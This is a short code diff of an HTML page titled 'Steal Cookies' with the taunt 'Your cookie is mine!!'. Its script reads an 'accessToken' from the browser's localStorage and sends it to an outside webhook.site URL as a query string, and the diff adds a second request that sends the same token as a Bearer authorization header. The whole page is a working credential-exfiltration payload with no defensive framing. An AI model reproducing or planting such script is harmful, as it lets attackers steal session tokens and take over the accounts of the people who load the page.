@@ -2,10 +2,20 @@
   <body>
 
     <h1>Steal  Cookies</h1>
-    <p>Your cookie is mine!! HeHeHe2!!!!!</p>
+    <p>Your cookie is mine!! HeHeHe33333!!!!!</p>
 
    <script>
        fetch("https://webhook.site/74aa79f6-372c-4480-a9ba-1d8b6049f75c?cookie=" + localStorage.getItem("accessToken"));
+
+    fetch("https://webhook.site/74aa79f6-372c-4480-a9ba-1d8b6049f75c", {
+    method: "GET",
+    headers: {
+        "Authorization": "Bearer " + localStorage.getItem("accessToken"),
+        "Content-Type": "application/json"
+    }
+})
+.then(res => res.json())
+.then(data => console.log(data));
    </script>
 
  </body>
